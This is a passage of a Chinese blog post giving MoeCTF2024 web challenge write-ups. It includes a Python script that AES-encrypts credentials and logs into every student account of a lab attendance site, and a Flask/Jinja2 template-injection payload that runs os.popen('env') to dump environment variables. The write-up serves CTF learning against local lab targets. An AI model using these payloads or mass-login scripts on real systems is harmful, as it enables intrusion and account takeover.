class="hljs-attribute">k</span>==&#x27;4&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;东南方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;4&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;东南方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;5&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;南方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;5&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;南方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;6&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西南方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;6&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;西南方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;7&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;7&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;西方一个&quot;</span><br>            elif <span class="hljs-attribute">k</span>==&#x27;8&#x27;and <span class="hljs-attribute">mark1</span>==0:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] = <span class="hljs-string">&quot;西北方一个，&quot;</span><br>                <span class="hljs-attribute">mark1</span>=1<br>            elif <span class="hljs-attribute">k</span>==&#x27;8&#x27;and <span class="hljs-attribute">mark1</span>==1:<br>                data[<span class="hljs-string">&quot;direct&quot;</span>] += <span class="hljs-string">&quot;西北方一个&quot;</span><br><br><br><br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;url=&#123;url&#125; data=&#123;data&#125;&#x27;</span>)<br>    url = <span class="hljs-string">&#x27;http://127.0.0.1:57542/&#x27;</span><br><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="Re-从零开始的-XDU-教书生活"><a href="#Re-从零开始的-XDU-教书生活" class="headerlink" title="Re: 从零开始的 XDU 教书生活"></a>Re: 从零开始的 XDU 教书生活</h2><p>提示：<br>使用脚本重复发送请求直到所有人都签上到即可。如果思路受阻或者不知道怎么写脚本，欢迎通过下方锤子询问出题人。<br>建议先从浏览器简单看下该做什么再去看代码细节，直接看代码很难理清思路。<br>&#x2F;v2&#x2F;apis&#x2F;sign&#x2F;refreshQRCode 该接口用于刷新二维码并返回新的二维码的信息。如何组装一个签到链接可参考网页源码。（或者随便拿个签到二维码看一下指向的链接也差不多能搞懂）</p>
+<p>你成为了 XDU 的一个教师，现在你的任务是让所有学生签上到（需要从学生账号签上到，而不是通过教师代签）。 注意：</p>
+<p>本题约定：所有账号的用户名 &#x3D;&#x3D; 手机号 &#x3D;&#x3D; 密码。教师账号用户名：10000。<br>当浏览器开启签到页面时，二维码每 10 秒刷新一次，使用过期的二维码无法完成签到。（浏览器不开启签到页面时，不会进行自动刷新，可以持续使用有效的二维码，除非手动发送刷新二维码的请求） 当你完成任务后，请结束签到活动。你将会获得 Flag 。 本题的部分前端页面取自超星学习通网页，后端与其无关，仅用作场景还原，请勿对原网站进行任何攻击行为！</p>
+<p>先通过10000登录老师账号，看一下有多少人需要我们签的<br><img src="/images/6E4C0BDE7416417b9C6CF6EEC81C2041.png" srcset="/img/loading.gif" lazyload><br>这么多人，必须要写一个脚本了<br>先登录学生账号抓包看看<br><img src="/images/29AD5531EE51424c96B6C4ED066768DA.png" srcset="/img/loading.gif" lazyload><br>发现我们的账号密码被加密了，而cookie是随机生成的不可预测<br>再看看附件下载的app.py<br>这两个函数比较重要，我们的账号密码是AES加密<br><img src="/images/597FD934521F4c5e8F5C80CA4AADC9FB.png" srcset="/img/loading.gif" lazyload><br><img src="/images/8F105B596C7544e58B0146CE6DE2D587.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据代码写出AES加密</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br>def encrypt_by_aes<span class="hljs-function"><span class="hljs-params">(plaintext: str, key: str, iv: str)</span> -&gt;</span> str:<br>    key_bytes = key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    iv_bytes = iv.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    cipher = AES.<span class="hljs-keyword">new</span>(key_bytes, AES.MODE_CBC, iv_bytes)<br>    <br>    <span class="hljs-comment"># 将明文转为字节并进行填充（填充到块大小的倍数，通常是16字节）</span><br>    plaintext_bytes = pad(plaintext.encode(<span class="hljs-string">&quot;utf-8&quot;</span>), AES.block_size)<br>    <br>    <span class="hljs-comment"># 加密</span><br>    encrypted_bytes = cipher.encrypt(plaintext_bytes)<br>    <br>    <span class="hljs-comment"># 将加密后的字节进行 base64 编码</span><br>    encrypted = base64.b64encode(encrypted_bytes).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <br>    <span class="hljs-keyword">return</span> encrypted<br><br><br>def decrypt_by_aes<span class="hljs-function"><span class="hljs-params">(encrypted: str, key: str, iv: str)</span> -&gt;</span> str:<br>    key_bytes = key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    iv_bytes = iv.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    cipher = AES.<span class="hljs-keyword">new</span>(key_bytes, AES.MODE_CBC, iv_bytes)<br><br>    <span class="hljs-comment"># 解密前需要将 base64 编码的字符串解码为字节</span><br>    encrypted_bytes = base64.b64decode(encrypted)<br><br>    <span class="hljs-comment"># 解密</span><br>    decrypted_bytes = cipher.decrypt(encrypted_bytes)<br><br>    <span class="hljs-comment"># 去除填充</span><br>    pad = decrypted_bytes[-<span class="hljs-number">1</span>]<br>    decrypted_bytes = decrypted_bytes[:-pad]<br><br>    <span class="hljs-comment"># 将字节转换为字符串</span><br>    decrypted = decrypted_bytes.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> decrypted<br><br>key = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br>iv = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br><br><span class="hljs-comment"># 要加密的明文</span><br>plaintext = <span class="hljs-string">&quot;9613331&quot;</span><br><br><span class="hljs-comment"># 加密</span><br>encrypted_text = encrypt_by_aes(plaintext, key, iv)<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;Encrypted: &#123;encrypted_text&#125;&quot;</span>)<br><span class="hljs-comment">#print(encrypted_text)</span><br><br><span class="hljs-comment"># 解密</span><br><span class="hljs-comment">#decrypted_text = decrypt_by_aes(encrypted_text, key, iv)</span><br><span class="hljs-comment">#print(f&quot;Decrypted: &#123;decrypted_text&#125;&quot;)</span><br></code></pre></td></tr></table></figure>
+<p>与抓包内容对比看是否对应的上<br><img src="/images/89CE3D753D154e83931B21372005A7F6.png" srcset="/img/loading.gif" lazyload><br>一模一样<br>接着被导航到&#x2F;page&#x2F;sign&#x2F;signIn<br><img src="/images/0907CE4A836C46ffB60EAAF1CF134B15.png" srcset="/img/loading.gif" lazyload><br>扫描二维码，跳出二维码内容，进入这个网页就能签到了</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">58882</span><span class="hljs-regexp">/widget/</span>sign/e?id=<span class="hljs-number">4000000000000</span>&amp;c=<span class="hljs-number">3232369319357</span>&amp;enc=BAEEA1B833B76CFB2FF25FE93836D711&amp;DB_STRATEGY=PRIMARY_KEY&amp;STRATEGY_PARA=id<br></code></pre></td></tr></table></figure>
+<p><img src="/images/395C504A4F39451c92DA9DBB24A305A5.png" srcset="/img/loading.gif" lazyload><br>这里enc和signCode已经变了，但是我们可以推断出对应的是上面的c和enc值<br>接下来我们还要把网页上的用户爬下来,这里我是先保存到本地再爬的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 本地 HTML 文件路径</span><br>html_file = <span class="hljs-string">&quot;./签到.html&quot;</span>  <span class="hljs-comment"># 替换为你的本地 HTML 文件路径</span><br>output_file = <span class="hljs-string">&quot;output1.txt&quot;</span>  <span class="hljs-comment"># 保存结果的文件名</span><br><br><span class="hljs-comment"># 读取并解析 HTML 文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(html_file, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    soup = BeautifulSoup(file, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><br><span class="hljs-comment"># 打开输出文件，以写入模式</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> out_file:<br>    <span class="hljs-comment"># 查找所有符合条件的 &lt;div&gt; 标签</span><br>    divs = soup.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;item zoomIn \d+&#x27;</span>))<br><br>    <span class="hljs-comment"># 提取 class 属性中的数字并保存到文件中</span><br>    <span class="hljs-keyword">for</span> div <span class="hljs-keyword">in</span> divs:<br>        class_attr = div.get(<span class="hljs-string">&#x27;class&#x27;</span>)  <span class="hljs-comment"># 获取 class 属性</span><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> class_attr:<br>            <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, item)  <span class="hljs-comment"># 查找 class 属性中的数字</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>                out_file.write(<span class="hljs-keyword">match</span>.group() + <span class="hljs-string">&quot;\n&quot;</span>)  <span class="hljs-comment"># 将数字写入文件并换行</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;提取的数字已保存到 <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>思路：<br>爬取页面用户的账户–&gt;&#x2F;v2&#x2F;apis&#x2F;sign&#x2F;refreshQRCode获取enc和signCode值–&gt;把账户AES加密–&gt;访问&#x2F;fanyalogin页面发送数据包–&gt;获取cookies值–&gt;以cookies内的身份进入二维码内容页面</p>
+<p>最终代码</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import re<br>import base64<br><span class="hljs-keyword">from</span> Crypto.Cipher import AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding import pad<br>import time<br><br><br>def encrypt_by_aes(plaintext: str, key: str, iv: str) -&gt; str:<br>    key_bytes = key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    iv_bytes = iv.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)<br><br>    # 将明文转为字节并进行填充（填充到块大小的倍数，通常是16字节）<br>    plaintext_bytes = pad(plaintext.encode(<span class="hljs-string">&quot;utf-8&quot;</span>), AES.block_size)<br><br>    # 加密<br>    encrypted_bytes = cipher.encrypt(plaintext_bytes)<br><br>    # 将加密后的字节进行 base64 编码<br>    encrypted = base64.b64encode(encrypted_bytes).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>    return encrypted<br><br>key = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br>iv = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br><br><br><br><br><br><span class="hljs-comment"># 保存结果的文件名</span><br>output_file = <span class="hljs-string">&quot;output1.txt&quot;</span><br><br><span class="hljs-comment"># 读取保存的数据</span><br>with open(output_file, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;utf-8&quot;</span>) as file:<br>    lines = file.readlines()<br><br><span class="hljs-comment"># 循环遍历每一行数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    a = requests.session()<br><br>    url = <span class="hljs-string">&#x27;http://127.0.0.1:35849/v2/apis/sign/refreshQRCode&#x27;</span><br><br>    b = a.<span class="hljs-built_in">get</span>(<span class="hljs-attribute">url</span>=url)<br>    <span class="hljs-built_in">print</span>(b.text)<br>    # 提取signCode<br>    signCode = re.findall(r<span class="hljs-string">&#x27;&quot;signCode&quot;:&quot;(.*?)&quot;&#x27;</span>, b.text)<br>    signCode = str(signCode)<br>    signCode = signCode.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    # 提取enc值<br>    enc = re.findall(r<span class="hljs-string">&#x27;&quot;enc&quot;:&quot;(.*?)&quot;&#x27;</span>, b.text)<br>    enc = str(enc)<br>    enc = enc.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;signCode=&#x27;</span>, signCode)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;enc=&#x27;</span>, enc)<br><br>    number = line.strip()  # 去除行末尾的换行符<br>    plaintext = number<br>    encrypted_text = encrypt_by_aes(plaintext, key, iv)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;encrtpted==&#x27;</span>,encrypted_text)<br>    <span class="hljs-attribute">url1</span>=<span class="hljs-string">&#x27;http://127.0.0.1:35849/fanyalogin&#x27;</span><br>    data=&#123;<br>    <span class="hljs-string">&quot;fid&quot;</span>:-1,<br>    <span class="hljs-string">&quot;uname&quot;</span>:f<span class="hljs-string">&quot;&#123;encrypted_text&#125;&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:f<span class="hljs-string">&quot;&#123;encrypted_text&#125;&quot;</span>,<br>    <span class="hljs-string">&quot;refer&quot;</span>:<span class="hljs-string">&quot;https%253A%252F%252Fi.chaoxing.com&quot;</span>,<br>    <span class="hljs-string">&quot;t&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<br>    <span class="hljs-string">&quot;forbidotherlogin&quot;</span>:0,<br>    <span class="hljs-string">&quot;doubleFactorLogin&quot;</span>:0,<br>    <span class="hljs-string">&quot;independentId&quot;</span>:0,<br>    <span class="hljs-string">&quot;independentNameId&quot;</span>:0<br>    &#125;<br><br>    cookies = &#123;<br>        <span class="hljs-string">&quot;retainlogin&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>        <span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;f5ba764e-040a-400c-ae13-80fedd7caac6&quot;</span><br>    &#125;<br>    <span class="hljs-attribute">login1</span>=requests.session()<br>    login = login1.post(<span class="hljs-attribute">url</span>=url1,data=data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data注入&quot;</span>,login)<br>    # <span class="hljs-built_in">print</span>(login.cookies)<br>    cook = login.cookies<br>    <span class="hljs-built_in">print</span>(cook)<br>    <span class="hljs-keyword">for</span> cookie <span class="hljs-keyword">in</span> cook:<br>        <span class="hljs-keyword">if</span> cookie.name == <span class="hljs-string">&quot;token&quot;</span>:<br>            token_value = cookie.value #token值<br>            <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;token=&#123;token_value&#125;&quot;</span>)<br>            cookies[<span class="hljs-string">&quot;token&quot;</span>]=token_value<br>            break  # 找到后就可以停止遍历<br>    <span class="hljs-built_in">print</span>(cookies)<br><br>    url2 =f<span class="hljs-string">&#x27;http://127.0.0.1:35849/widget/sign/e?id=4000000000000&amp;c=&#123;signCode&#125;&amp;enc=&#123;enc&#125;&amp;DB_STRATEGY=PRIMARY_KEY&amp;STRATEGY_PARA=id&#x27;</span><br>    <span class="hljs-attribute">login3s</span>=requests.session()<br>    login3 = login3s.<span class="hljs-built_in">get</span>(<span class="hljs-attribute">url</span>=url2,cookies=cookies)<br>    <span class="hljs-built_in">print</span>(login3)<br>    time.sleep(0.5)<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="who’s-blog"><a href="#who’s-blog" class="headerlink" title="who’s blog?"></a>who’s blog?</h2><p>这回机器人没了，但多了一个参数id</p>
+<p><img src="/images/9ABA1C191EF54d0dB26FF457E3BA5328.png" srcset="/img/loading.gif" lazyload><br>存在Flask Jinjia2模版注入漏洞</p>
+<p>最终代码</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[238].__init__[%27__glo%27+%27bals__%27][%27__builtins__%27][%27eval%27](%<span class="hljs-name">27__import__</span>(%<span class="hljs-name">22os</span>%<span class="hljs-number">22</span>).popen(%<span class="hljs-name">22env</span>%<span class="hljs-number">22</span>).read()%<span class="hljs-number">27</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/D315171C3FE04f849B158669668D449A.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>MoeCTF2024</div>
+      <div>http://example.com/2024/08/24/MoeCTF2024/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>奇怪的奇怪</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/24/BaseCTF2024/" title="BaseCTF2024高校联合新生赛">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BaseCTF2024高校联合新生赛</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" title="渗透测试学习笔记">
+                        <span class="hidden-mobile">渗透测试学习笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客量 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
